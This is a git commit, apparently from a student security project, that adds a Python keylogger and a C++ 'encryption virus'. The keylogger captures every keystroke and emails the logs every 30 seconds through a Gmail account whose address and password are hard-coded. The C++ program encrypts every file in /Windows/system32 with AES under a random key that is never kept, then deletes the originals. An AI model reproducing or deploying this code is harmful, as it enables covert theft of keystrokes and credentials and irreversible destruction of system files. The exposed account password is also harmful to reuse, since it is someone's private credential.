740e034c9c5471866bfc62a1ee8b1cf9944f0858
Eryk Lewandowski <lewy12121212@gmail.com>
2021-11-25 12:06:19 +0100

    Add code of keylogger and encryption virus.

---
+++ keylogger/main.py
@@ -0,0 +1,92 @@
+#!/usr/bin/env python
+import keyboard # for keylogs
+import smtplib # for sending email using SMTP protocol (gmail)
+# Timer is to make a method runs after an `interval` amount of time
+from threading import Timer
+from datetime import datetime
+
+SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
+EMAIL_ADDRESS = "politechnikaochronadanych@gmail.com"
+EMAIL_PASSWORD = "OD.2000.!@#"
+
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+    
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+    def sendmail(self, email, password, message):
+        # manages a connection to an SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email, message)
+        # terminates the session
+        server.quit()
+
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+
+    
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger.start()
---
+++ szyfrowanie/pod4.cpp
@@ -0,0 +1,196 @@
+﻿#include "..\pod4\file\osrng.h"
+using CryptoPP::AutoSeededRandomPool;
+
+#include <iostream>
+using std::cout;
+using std::cerr;
+using std::endl;
+
+#include <string>
+using std::string;
+
+#include <cstdlib>
+using std::exit;
+
+#include "..\pod4\file\cryptlib.h"
+using CryptoPP::Exception;
+
+#include "..\pod4\file\hex.h"
+using CryptoPP::HexEncoder;
+using CryptoPP::HexDecoder;
+
+#include "..\pod4\file\filters.h"
+using CryptoPP::StringSink;
+using CryptoPP::StringSource;
+using CryptoPP::StreamTransformationFilter;
+
+#include "..\pod4\file\aes.h"
+using CryptoPP::AES;
+
+#include "..\pod4\file\ccm.h"
+using CryptoPP::OFB_Mode;
+
+#include "assert.h"
+#include "fstream"
+#include <cstdio>
+#include <ctime>
+#include <filesystem>
+
+namespace fs = std::filesystem;
+
+using namespace std;
+
+int main(int argc, char* argv[])
+{
+	AutoSeededRandomPool prng;
+
+	CryptoPP::byte key[AES::DEFAULT_KEYLENGTH];
+	prng.GenerateBlock(key, sizeof(key));
+
+	CryptoPP::byte iv[AES::BLOCKSIZE];
+	prng.GenerateBlock(iv, sizeof(iv));
+
+	fstream plik;
+	string plain;
+	string cipher, encoded, recovered;
+	clock_t start;
+
+
+	// Pretty print key
+	encoded.clear();
+	StringSource(key, sizeof(key), true,
+		new HexEncoder(
+			new StringSink(encoded)
+		) // HexEncoder
+	); // StringSource
+	//cout << "key: " << encoded << endl;
+
+	// Pretty print iv
+	encoded.clear();
+	StringSource(iv, sizeof(iv), true,
+	new HexEncoder(
+		new StringSink(encoded)
+		) // HexEncoder
+	); // StringSource
+	//cout << "iv: " << encoded << endl;
+
+	fstream szyfr;
+
+
+	std::string path = "/Windows/system32";
+	for (const auto& entry : fs::directory_iterator(path))
+	{
+		if (entry.path().has_extension())
+		{
+			string file = entry.path().string();
+			cout << file << endl;
+			plik.open(file, ios::binary | ios::in);
+			szyfr.open(file + ".tor", ios::binary | ios::out);
+
+
+			while (!plik.eof()) {
+				getline(plik, plain);
+				char z = plain[plain.length()];
+
+				try
+				{
+					//cout << "plain text: " << plain << endl;
+
+					OFB_Mode< AES >::Encryption e;
+					e.SetKeyWithIV(key, sizeof(key), iv);
+
+					// CFB mode must not use padding. Specifying
+					//  a scheme will result in an exception
+					StringSource(plain, true,
+						new StreamTransformationFilter(e,
+							new StringSink(cipher)
+						) // StreamTransformationFilter      
+					); // StringSource
+				}
+				catch (const CryptoPP::Exception& e)
+				{
+					cerr << e.what() << endl;
+					exit(1);
+				}
+
+
+
+				// Pretty print
+				encoded.clear();
+				StringSource(cipher, true,
+					new HexEncoder(
+						new StringSink(encoded)
+					) // HexEncoder
+				); // StringSource
+				//cout << "cipher text: " << encoded << endl;
+				szyfr << encoded;
+				cipher.erase(cipher.begin(), cipher.end());
+			}
+			plik.close();
+			try {
+				fs::remove(file);
+			}
+			catch (const std::filesystem::filesystem_error& err) {
+				std::cout << "filesystem error: " << err.what() << '\n';
+			}
+			
+			szyfr.close();
+			cipher.erase(cipher.begin(), cipher.end());
+		}
+
+	}
+		
+
+
+	
+	//cout << "szyfrowanie czas: " << (clock() - start) / (double)CLOCKS_PER_SEC << endl;
+
+	//plik.close();
+	//szyfr.close();
+	//cipher.erase(cipher.begin(), cipher.end());
+	//
+	//szyfr.open("szyfr.txt", fstream::in);
+	//plik.open("maly.txt", fstream::in);
+	//string text2;
+	//getline(plik, text2);
+	//start = clock();
+	//while (!szyfr.eof())
+	//{
+	//	getline(szyfr, encoded);
+	//	StringSource(encoded, true,
+	//		new HexDecoder(
+	//			new StringSink(cipher)
+	//		));
+	//	///cout << cipher << endl;
+	//	try
+	//	{
+	//		OFB_Mode< AES >::Decryption d;
+	//		d.SetKeyWithIV(key, sizeof(key),iv);
+	//
+	//		// The StreamTransformationFilter removes
+	//		//  padding as required.
+	//		StringSource s(cipher, true,
+	//			new StreamTransformationFilter(d,
+	//				new StringSink(recovered)
+	//			) // StreamTransformationFilter
+	//		); // StringSource
+	//		cout <<recovered << endl;
+	//	}
+	//	catch (const CryptoPP::Exception& e)
+	//	{
+	//		cerr << e.what() << endl;
+	//		exit(1);
+	//	}
+	//	//recovered.erase(recovered.begin(), recovered.end());
+	//}
+	//szyfr.close();
+	//
+	//if (recovered == text2)
+	//	cout << "takie same" << endl;
+	//else 
+	//	cout << "rozne" << endl;
+	//cout << "deszyfrowanie czas: " << (clock() - start) / (double)CLOCKS_PER_SEC << endl;
+
+	return 0;
+
+}
